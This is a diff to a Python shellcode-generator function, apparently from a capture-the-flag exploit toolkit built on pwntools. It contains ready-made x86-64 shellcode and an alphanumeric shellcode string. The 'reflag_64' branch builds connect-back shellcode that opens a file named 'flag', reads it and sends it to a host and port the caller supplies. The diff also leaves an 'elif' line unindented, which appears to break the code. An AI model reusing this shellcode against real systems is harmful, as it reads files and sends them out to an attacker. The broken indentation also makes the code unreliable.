@@ -195,7 +195,7 @@ def shellcode_store(demand, *args):
         shellcode = "Qh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
         return shellcode
 
-    elif demand == 'reflag_64':
+elif demand=='reflag_64':
         socket = args[0]
         ip, port = socket.split()
         ip_hex = ''.join(reversed([hex(int(num))[2:].zfill(2) for num in ip.split('.')]))
@@ -203,9 +203,10 @@ def shellcode_store(demand, *args):
         port_hex_split = [port_hex[i:i + 2] for i in range(0, len(port_hex), 2)]  # 按两个数字分割十六进制字符串
         port_hex = ''.join(reversed(port_hex_split))
         socket = "mov rbx," + "0x" + ip_hex + port_hex + "0002"
-        result = asm(socket)
-        shellcode = b"\x6A\x02\x5F\x6A\x01\x5E\x48\x31\xD2\x6A\x29\x58\x0F\x05\x50\x5F\x6A\x10\x5A" + result + b"\x53\x54\x5E\x6A\x2A\x58\x0F\x05"
-        shellcode += b"\x50\x5B\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x53\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
+        context.arch = 'amd64'
+        result =asm(socket)
+        shellcode=b"\x6A\x02\x5F\x6A\x01\x5E\x48\x31\xD2\x6A\x29\x58\x0F\x05\x50\x5F\x6A\x10\x5A"+result+b"\x53\x54\x5E\x6A\x2A\x58\x0F\x05"
+        shellcode+=b"\x57\x5B\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x53\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
         return shellcode
 
     else:
